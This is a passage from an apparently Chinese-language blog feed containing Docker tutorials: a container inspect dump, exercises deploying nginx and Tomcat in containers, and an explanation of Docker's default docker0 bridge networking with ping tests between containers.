&quot;&quot;,</span><br><span class="line">            &quot;StartedAt&quot;: &quot;2021-08-29T01:53:05.774289777Z&quot;,</span><br><span class="line">            &quot;FinishedAt&quot;: &quot;2021-08-29T01:53:05.773591821Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Image&quot;: &quot;sha256:300e315adb2f96afe5f0b2780b87f28ae95231fe3bdd1e16b9ba606307728f55&quot;,</span><br><span class="line">        &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095/resolv.conf&quot;,</span><br><span class="line">        &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095/hostname&quot;,</span><br><span class="line">        &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095/hosts&quot;,</span><br><span class="line">        &quot;LogPath&quot;: &quot;/var/lib/docker/containers/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095-json.log&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;/xenodochial_cartwright&quot;,</span><br><span class="line">        &quot;RestartCount&quot;: 0,</span><br><span class="line">        &quot;Driver&quot;: &quot;overlay2&quot;,</span><br><span class="line">        &quot;Platform&quot;: &quot;linux&quot;,</span><br><span class="line">        &quot;MountLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;ProcessLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;AppArmorProfile&quot;: &quot;&quot;,</span><br><span class="line">        &quot;ExecIDs&quot;: null,</span><br><span class="line">        &quot;HostConfig&quot;: &#123;</span><br><span class="line">            &quot;Binds&quot;: null,</span><br><span class="line">            &quot;ContainerIDFile&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LogConfig&quot;: &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;json-file&quot;,</span><br><span class="line">                &quot;Config&quot;: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;NetworkMode&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;PortBindings&quot;: &#123;&#125;,</span><br><span class="line">            &quot;RestartPolicy&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;no&quot;,</span><br><span class="line">                &quot;MaximumRetryCount&quot;: 0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;AutoRemove&quot;: false,</span><br><span class="line">            &quot;VolumeDriver&quot;: &quot;&quot;,</span><br><span class="line">            &quot;VolumesFrom&quot;: null,</span><br><span class="line">            &quot;CapAdd&quot;: null,</span><br><span class="line">            &quot;CapDrop&quot;: null,</span><br><span class="line">            &quot;CgroupnsMode&quot;: &quot;host&quot;,</span><br><span class="line">            &quot;Dns&quot;: [],</span><br><span class="line">            &quot;DnsOptions&quot;: [],</span><br><span class="line">            &quot;DnsSearch&quot;: [],</span><br><span class="line">            &quot;ExtraHosts&quot;: null,</span><br><span class="line">            &quot;GroupAdd&quot;: null,</span><br><span class="line">            &quot;IpcMode&quot;: &quot;private&quot;,</span><br><span class="line">            &quot;Cgroup&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Links&quot;: null,</span><br><span class="line">            &quot;OomScoreAdj&quot;: 0,</span><br><span class="line">            &quot;PidMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Privileged&quot;: false,</span><br><span class="line">            &quot;PublishAllPorts&quot;: false,</span><br><span class="line">            &quot;ReadonlyRootfs&quot;: false,</span><br><span class="line">            &quot;SecurityOpt&quot;: null,</span><br><span class="line">            &quot;UTSMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;UsernsMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;ShmSize&quot;: 67108864,</span><br><span class="line">            &quot;Runtime&quot;: &quot;runc&quot;,</span><br><span class="line">            &quot;ConsoleSize&quot;: [</span><br><span class="line">                0,</span><br><span class="line">                0</span><br><span class="line">            ],</span><br><span class="line">            &quot;Isolation&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpuShares&quot;: 0,</span><br><span class="line">            &quot;Memory&quot;: 0,</span><br><span class="line">            &quot;NanoCpus&quot;: 0,</span><br><span class="line">            &quot;CgroupParent&quot;: &quot;&quot;,</span><br><span class="line">            &quot;BlkioWeight&quot;: 0,</span><br><span class="line">            &quot;BlkioWeightDevice&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceReadBps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceWriteBps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceReadIOps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceWriteIOps&quot;: null,</span><br><span class="line">            &quot;CpuPeriod&quot;: 0,</span><br><span class="line">            &quot;CpuQuota&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimePeriod&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimeRuntime&quot;: 0,</span><br><span class="line">            &quot;CpusetCpus&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpusetMems&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Devices&quot;: [],</span><br><span class="line">            &quot;DeviceCgroupRules&quot;: null,</span><br><span class="line">            &quot;DeviceRequests&quot;: null,</span><br><span class="line">            &quot;KernelMemory&quot;: 0,</span><br><span class="line">            &quot;KernelMemoryTCP&quot;: 0,</span><br><span class="line">            &quot;MemoryReservation&quot;: 0,</span><br><span class="line">            &quot;MemorySwap&quot;: 0,</span><br><span class="line">            &quot;MemorySwappiness&quot;: null,</span><br><span class="line">            &quot;OomKillDisable&quot;: false,</span><br><span class="line">            &quot;PidsLimit&quot;: null,</span><br><span class="line">            &quot;Ulimits&quot;: null,</span><br><span class="line">            &quot;CpuCount&quot;: 0,</span><br><span class="line">            &quot;CpuPercent&quot;: 0,</span><br><span class="line">            &quot;IOMaximumIOps&quot;: 0,</span><br><span class="line">            &quot;IOMaximumBandwidth&quot;: 0,</span><br><span class="line">            &quot;MaskedPaths&quot;: [</span><br><span class="line">                &quot;/proc/asound&quot;,</span><br><span class="line">                &quot;/proc/acpi&quot;,</span><br><span class="line">                &quot;/proc/kcore&quot;,</span><br><span class="line">                &quot;/proc/keys&quot;,</span><br><span class="line">                &quot;/proc/latency_stats&quot;,</span><br><span class="line">                &quot;/proc/timer_list&quot;,</span><br><span class="line">                &quot;/proc/timer_stats&quot;,</span><br><span class="line">                &quot;/proc/sched_debug&quot;,</span><br><span class="line">                &quot;/proc/scsi&quot;,</span><br><span class="line">                &quot;/sys/firmware&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;ReadonlyPaths&quot;: [</span><br><span class="line">                &quot;/proc/bus&quot;,</span><br><span class="line">                &quot;/proc/fs&quot;,</span><br><span class="line">                &quot;/proc/irq&quot;,</span><br><span class="line">                &quot;/proc/sys&quot;,</span><br><span class="line">                &quot;/proc/sysrq-trigger&quot;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;GraphDriver&quot;: &#123;</span><br><span class="line">            &quot;Data&quot;: &#123;</span><br><span class="line">                &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/9f58829d0c22ab90bee08aa58ddf072e689f795d72c4dfd3b5a95759a11357da-init/diff:/var/lib/docker/overlay2/b298ad9ced6d87c18f01408e96b63e31dbc7ef41c7b5d6a749e54636a7730b15/diff&quot;,</span><br><span class="line">                &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/9f58829d0c22ab90bee08aa58ddf072e689f795d72c4dfd3b5a95759a11357da/merged&quot;,</span><br><span class="line">                &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/9f58829d0c22ab90bee08aa58ddf072e689f795d72c4dfd3b5a95759a11357da/diff&quot;,</span><br><span class="line">                &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/9f58829d0c22ab90bee08aa58ddf072e689f795d72c4dfd3b5a95759a11357da/work&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Name&quot;: &quot;overlay2&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Mounts&quot;: [],</span><br><span class="line">        &quot;Config&quot;: &#123;</span><br><span class="line">            &quot;Hostname&quot;: &quot;ec6e3fdec8c7&quot;,</span><br><span class="line">            &quot;Domainname&quot;: &quot;&quot;,</span><br><span class="line">            &quot;User&quot;: &quot;&quot;,</span><br><span class="line">            &quot;AttachStdin&quot;: false,</span><br><span class="line">            &quot;AttachStdout&quot;: false,</span><br><span class="line">            &quot;AttachStderr&quot;: false,</span><br><span class="line">            &quot;Tty&quot;: false,</span><br><span class="line">            &quot;OpenStdin&quot;: false,</span><br><span class="line">            &quot;StdinOnce&quot;: false,</span><br><span class="line">            &quot;Env&quot;: [</span><br><span class="line">                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Cmd&quot;: [</span><br><span class="line">                &quot;/bin/bash&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Image&quot;: &quot;centos&quot;,</span><br><span class="line">            &quot;Volumes&quot;: null,</span><br><span class="line">            &quot;WorkingDir&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Entrypoint&quot;: null,</span><br><span class="line">            &quot;OnBuild&quot;: null,</span><br><span class="line">            &quot;Labels&quot;: &#123;</span><br><span class="line">                &quot;org.label-schema.build-date&quot;: &quot;20201204&quot;,</span><br><span class="line">                &quot;org.label-schema.license&quot;: &quot;GPLv2&quot;,</span><br><span class="line">                &quot;org.label-schema.name&quot;: &quot;CentOS Base Image&quot;,</span><br><span class="line">                &quot;org.label-schema.schema-version&quot;: &quot;1.0&quot;,</span><br><span class="line">                &quot;org.label-schema.vendor&quot;: &quot;CentOS&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;NetworkSettings&quot;: &#123;</span><br><span class="line">            &quot;Bridge&quot;: &quot;&quot;,</span><br><span class="line">            &quot;SandboxID&quot;: &quot;d3fedfdee8e6f0d6aa83a793c4e3e56ef29086f8e2cb6ecafc6c280c3d103b8f&quot;,</span><br><span class="line">            &quot;HairpinMode&quot;: false,</span><br><span class="line">            &quot;LinkLocalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LinkLocalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;Ports&quot;: &#123;&#125;,</span><br><span class="line">            &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/d3fedfdee8e6&quot;,</span><br><span class="line">            &quot;SecondaryIPAddresses&quot;: null,</span><br><span class="line">            &quot;SecondaryIPv6Addresses&quot;: null,</span><br><span class="line">            &quot;EndpointID&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Gateway&quot;: &quot;&quot;,</span><br><span class="line">            &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;IPAddress&quot;: &quot;&quot;,</span><br><span class="line">            &quot;IPPrefixLen&quot;: 0,</span><br><span class="line">            &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">            &quot;MacAddress&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Networks&quot;: &#123;</span><br><span class="line">                &quot;bridge&quot;: &#123;</span><br><span class="line">                    &quot;IPAMConfig&quot;: null,</span><br><span class="line">                    &quot;Links&quot;: null,</span><br><span class="line">                    &quot;Aliases&quot;: null,</span><br><span class="line">                    &quot;NetworkID&quot;: &quot;115a2351052d4f81bc4d8f1c20f87f29da1d4bb50ae3543e2d8a1675b1630dc1&quot;,</span><br><span class="line">                    &quot;EndpointID&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;IPAddress&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;IPPrefixLen&quot;: 0,</span><br><span class="line">                    &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">                    &quot;MacAddress&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;DriverOpts&quot;: null</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="5、从容器内拷贝文件到主机上"><a href="#5、从容器内拷贝文件到主机上" class="headerlink" title="5、从容器内拷贝文件到主机上"></a>5、从容器内拷贝文件到主机上</h2><p>&emsp;&emsp;<code>docker cp 容器ID:容器内路径 主机路径</code></p>
<p>&emsp;&emsp;拷贝是一个手动过程，未来我们使用-v卷的技术，可以实现自动同步</p>
<h1 id="五、小结"><a href="#五、小结" class="headerlink" title="五、小结"></a>五、小结</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630204563384-b3dea05b-fe93-49f5-bc12-bac9fba31374.png" alt="img"></p>
<h1 id="六、练习"><a href="#六、练习" class="headerlink" title="六、练习"></a>六、练习</h1><h2 id="1、安装部署nginx"><a href="#1、安装部署nginx" class="headerlink" title="1、安装部署nginx"></a>1、安装部署nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@VM-0-15-centos ~]# docker search nginx</span><br><span class="line">NAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">nginx                             Official build of Nginx.                        15385     [OK]</span><br><span class="line">jwilder/nginx-proxy               Automated Nginx reverse proxy for docker con…   2061                 [OK]</span><br><span class="line">richarvey/nginx-php-fpm           Container running Nginx + PHP-FPM capable of…   816                  [OK]</span><br><span class="line">jc21/nginx-proxy-manager          Docker container for managing Nginx proxy ho…   237</span><br><span class="line">linuxserver/nginx                 An Nginx container, brought to you by LinuxS…   152</span><br><span class="line">tiangolo/nginx-rtmp               Docker image with Nginx using the nginx-rtmp…   140                  [OK]</span><br><span class="line">jlesage/nginx-proxy-manager       Docker container for Nginx Proxy Manager        135                  [OK]</span><br><span class="line">alfg/nginx-rtmp                   NGINX, nginx-rtmp-module and FFmpeg from sou…   105                  [OK]</span><br><span class="line">jasonrivers/nginx-rtmp            Docker images to host RTMP streams using NGI…   92                   [OK]</span><br><span class="line">nginxdemos/hello                  NGINX webserver that serves a simple page co…   71                   [OK]</span><br><span class="line">privatebin/nginx-fpm-alpine       PrivateBin running on an Nginx, php-fpm &amp; Al…   56                   [OK]</span><br><span class="line">nginx/nginx-ingress               NGINX and  NGINX Plus Ingress Controllers fo…   55</span><br><span class="line">nginxinc/nginx-unprivileged       Unprivileged NGINX Dockerfiles                  46</span><br><span class="line">staticfloat/nginx-certbot         Opinionated setup for automatic TLS certs lo…   24                   [OK]</span><br><span class="line">nginx/nginx-prometheus-exporter   NGINX Prometheus Exporter for NGINX and NGIN…   19</span><br><span class="line">schmunk42/nginx-redirect          A very simple container to redirect HTTP tra…   19                   [OK]</span><br><span class="line">nginxproxy/nginx-proxy            Automated Nginx reverse proxy for docker con…   18</span><br><span class="line">centos/nginx-112-centos7          Platform for running nginx 1.12 or building …   15</span><br><span class="line">centos/nginx-18-centos7           Platform for running nginx 1.8 or building n…   13</span><br><span class="line">raulr/nginx-wordpress             Nginx front-end for the official wordpress:f…   13                   [OK]</span><br><span class="line">flashspys/nginx-static            Super Lightweight Nginx Image                   10                   [OK]</span><br><span class="line">mailu/nginx                       Mailu nginx frontend                            9                    [OK]</span><br><span class="line">sophos/nginx-vts-exporter         Simple server that scrapes Nginx vts stats a…   7                    [OK]</span><br><span class="line">ansibleplaybookbundle/nginx-apb   An APB to deploy NGINX                          2                    [OK]</span><br><span class="line">wodby/nginx                       Generic nginx                                   1                    [OK]</span><br><span class="line">[root@VM-0-15-centos ~]# docker pull nginx</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/nginx</span><br><span class="line">e1acddbe380c: Already exists</span><br><span class="line">e21006f71c6f: Pull complete</span><br><span class="line">f3341cc17e58: Pull complete</span><br><span class="line">2a53fa598ee2: Pull complete</span><br><span class="line">12455f71a9b5: Pull complete</span><br><span class="line">b86f2ba62d17: Pull complete</span><br><span class="line">Digest: sha256:4d4d96ac750af48c6a551d757c1cbfc071692309b491b70b2b8976e102dd3fef</span><br><span class="line">Status: Downloaded newer image for nginx:latest</span><br><span class="line">docker.io/library/nginx:latest</span><br><span class="line">[root@VM-0-15-centos ~]# docker images</span><br><span class="line">REPOSITORY      TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">nginx           latest    dd34e67e3371   13 days ago    133MB</span><br><span class="line">mysql           latest    5a4e492065c7   13 days ago    514MB</span><br><span class="line">hello-world     latest    d1165f221234   5 months ago   13.3kB</span><br><span class="line">centos          latest    300e315adb2f   8 months ago   209MB</span><br><span class="line">80x86/typecho   latest    3437f7346b4c   2 years ago    53.9MB</span><br><span class="line">[root@VM-0-15-centos ~]# docker run -d --name nginx01 -p 3344:80 nginx</span><br><span class="line">d0850b4943fcd70f14dd895826012a77bdb219b992060fc31fea07d8f5536803</span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES</span><br><span class="line">d0850b4943fc   nginx     &quot;/docker-entrypoint.…&quot;   5 seconds ago   Up 4 seconds   0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp   nginx01</span><br><span class="line">[root@VM-0-15-centos ~]# curl localhost:3344</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        width: 35em;</span><br><span class="line">        margin: 0 auto;</span><br><span class="line">        font-family: Tahoma, Verdana, Arial, sans-serif;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span><br><span class="line">working. Further configuration is required.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;For online documentation and support please refer to</span><br><span class="line">&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;</span><br><span class="line">Commercial support is available at</span><br><span class="line">&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630372810739-1ec60112-f6eb-4a50-8173-89faf02cb88c.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630324536403-623f1bae-6085-4b88-a6bb-ce2d93817546.png" alt="img"></p>
<h2 id="2、安装部署Tomcat"><a href="#2、安装部署Tomcat" class="headerlink" title="2、安装部署Tomcat"></a>2、安装部署Tomcat</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">官方的使用</span></span><br><span class="line">docker run -it --rm tomcat:9.0</span><br><span class="line"><span class="meta">#</span><span class="bash">我们之前的启动都是后台，停止了容器之后，容器还是可以查到 而--rm一般用来测试，用完就删除容器</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">下载再运行</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker pull tomcat</span><br><span class="line">[root@VM-0-15-centos ~]# docker run -d -p 3355:8080 --name tomcat01 tomcat</span><br><span class="line">64dc6975f6e47c040b7c476f7a4aa8af43fff314cfc3bcc539da5524b7b1d2c5</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">测试访问发现找不到</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">进入容器</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker exec -it tomcat01 /bin/bash</span><br><span class="line">root@64dc6975f6e4:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     LICENSE  README.md      RUNNING.txt  conf  logs            temp     webapps.dist</span><br><span class="line">CONTRIBUTING.md  NOTICE   RELEASE-NOTES  bin          lib   native-jni-lib  webapps  work</span><br><span class="line">root@64dc6975f6e4:/usr/local/tomcat# cd webapps</span><br><span class="line">root@64dc6975f6e4:/usr/local/tomcat/webapps# ls</span><br><span class="line">root@64dc6975f6e4:/usr/local/tomcat/webapps#</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">发现问题：1、Linux命令少了 2、没有webapps</span></span><br><span class="line"><span class="meta">#</span><span class="bash">阿里云镜像的原因。默认是最小的镜像，所有不必要的都剔除掉</span></span><br><span class="line"><span class="meta">#</span><span class="bash">保证最小的可运行环境！</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630373865980-86138a2a-2230-4e61-bbbd-68c0fa3d4044.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ROOT在webapps.dist目录下</span></span><br><span class="line">root@64dc6975f6e4:/usr/local/tomcat# cd webapps.dist</span><br><span class="line">root@64dc6975f6e4:/usr/local/tomcat/webapps.dist# ls</span><br><span class="line">ROOT  docs  examples  host-manager  manager</span><br><span class="line">root@64dc6975f6e4:/usr/local/tomcat/webapps.dist# cd ..</span><br><span class="line">root@64dc6975f6e4:/usr/local/tomcat# cp -r webapps.dist/* webapps</span><br><span class="line">root@64dc6975f6e4:/usr/local/tomcat#</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">再次测试，成功</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630374285804-5074a7ab-e2e3-446c-8caa-70c1f5ceee1b.png" alt="img"></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker网络</title>
    <url>/post/20783356.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、理解Docker0"><a href="#一、理解Docker0" class="headerlink" title="一、理解Docker0"></a>一、理解Docker0</h1><p>&emsp;&emsp;容器运行时如果没有指定网络模式，那么就默认是桥接模式的docker0</p>
<h2 id="1、测试"><a href="#1、测试" class="headerlink" title="1、测试"></a>1、测试</h2><p>&emsp;&emsp;三个网络：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630837758809-3af6e200-7f53-4770-87ff-835aa6e9dc33.png" alt="img">    </p>
<h2 id="2、问题"><a href="#2、问题" class="headerlink" title="2、问题"></a>2、问题</h2><p>&emsp;&emsp;docker是如何处理容器网络访问的？</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630838016138-efbfb049-64fc-4330-856f-dc344884f9a1.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">创建一个名为tomcat02的容器</span><br><span class="line">[root@VM-0-15-centos ~]# docker run -d -P --name tomcat02 tomcat</span><br><span class="line">a3be14a249d91c1103bb949f9db477f7332dbe3d5545e96c4106a17a10101bca</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查看容器的内网IP，发现容器启动的时候会得到一个 eth0@if87 IP地址，这是docker分配的</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker exec -it tomcat02 ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">86: eth0@if87: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:ac:12:00:06 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.18.0.6/16 brd 172.18.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">思考。本机能否ping通docker容器内部。答案是能，因为在同一网段</span></span><br><span class="line">[root@VM-0-15-centos ~]# ping 172.18.0.6</span><br><span class="line">PING 172.18.0.6 (172.18.0.6) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.18.0.6: icmp_seq=1 ttl=64 time=0.094 ms</span><br><span class="line">64 bytes from 172.18.0.6: icmp_seq=2 ttl=64 time=0.055 ms</span><br><span class="line">64 bytes from 172.18.0.6: icmp_seq=3 ttl=64 time=0.051 ms</span><br><span class="line">64 bytes from 172.18.0.6: icmp_seq=4 ttl=64 time=0.053 ms</span><br><span class="line">^C</span><br><span class="line">--- 172.18.0.6 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 2999ms</span><br><span class="line">rtt min/avg/max/mdev = 0.051/0.063/0.094/0.018 ms</span><br></pre></td></tr></table></figure>

<h2 id="3、原理"><a href="#3、原理" class="headerlink" title="3、原理"></a>3、原理</h2><p>&emsp;&emsp;我们每启动一个docker容器，docker就会给容器分配一个IP，我们只要安装了docker，就会有一个网卡docker0，使用的模式是桥接模式，使用的技术是veth-pair技术</p>
<p>&emsp;&emsp;比如启动tomcat2容器后，再次查看IP，可以发现多了个网卡</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630854416800-9e015767-ce70-441e-a7a6-99ac3e55e23e.png" alt="img"></p>
<p>&emsp;&emsp;再启动tomcat03容器，查看容器IP和本机IP，发现又多了一对网卡</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630854608910-7e05e5bf-f83c-47da-a3a8-cba9b72684f4.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630854638043-a0636339-9f1f-49d4-9421-bd9bdbb9cde0.png" alt="img"></p>
<p>&emsp;&emsp;我们发现这个容器的网卡都是一对一对的</p>
<p>&emsp;&emsp;evth-pair就是一对一的虚拟接口，它们都是成对出现的，一端连着协议，一端彼此相连。正因为有这个特性，evth-pair充当一座桥梁，连接各种虚拟网络设备。Openstack，Docker容器之间的连接，OVS的连接，都是使用evth-pair技术</p>
<p>&emsp;&emsp;我们来测试一下tomcat02和tomcat03是否可以ping通</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> tomcat02 ping tomcat03，能够ping通</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker exec -it tomcat02 ping 172.18.0.7</span><br><span class="line">PING 172.18.0.7 (172.18.0.7) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.18.0.7: icmp_seq=1 ttl=64 time=0.115 ms</span><br><span class="line">64 bytes from 172.18.0.7: icmp_seq=2 ttl=64 time=0.068 ms</span><br><span class="line">64 bytes from 172.18.0.7: icmp_seq=3 ttl=64 time=0.058 ms</span><br><span class="line">64 bytes from 172.18.0.7: icmp_seq=4 ttl=64 time=0.065 ms</span><br><span class="line">^C</span><br><span class="line">--- 172.18.0.7 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 1002ms</span><br><span class="line">rtt min/avg/max/mdev = 0.058/0.076/0.115/0.024 ms</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;绘制一张网络模型图</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630855055700-64fdf8c5-3237-4a46-90ef-1e7fb3758183.png" alt="img"></p>
<p>&emsp;&emsp;结论：所有的容器不指定网络的情况下，都是docker0路由的，docker会给我们的容器分配一个默认的可用IP</p>
<h2 id="4、小结"><a href="#4、小结" class="headerlink" title="4、小结"></a>4、小结</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630855255657-6f58d2d2-7cfc-46fb-a440-f510b562f252.png" alt="img"></p>
<p>&emsp;&emsp;Docker中所有的网络接口都是虚拟的。虚拟的转法效率高！</p>
<p>&emsp;&emsp;只要容器stop或者删除，那对应网桥对就没了</p>
<h1 id="二、容器互联–link"><a href="#二、容器互联–link" class="headerlink" title="二、容器互联–link"></a>二、容器互联–link</h1><p>&emsp;&emsp;思考一个场景，我们编写了一个微服务，database url=ip:，项目不重启，数据库IP换掉了，我们希望可以处理这个问题，可以名字来访问容器，那该怎么做？</p>
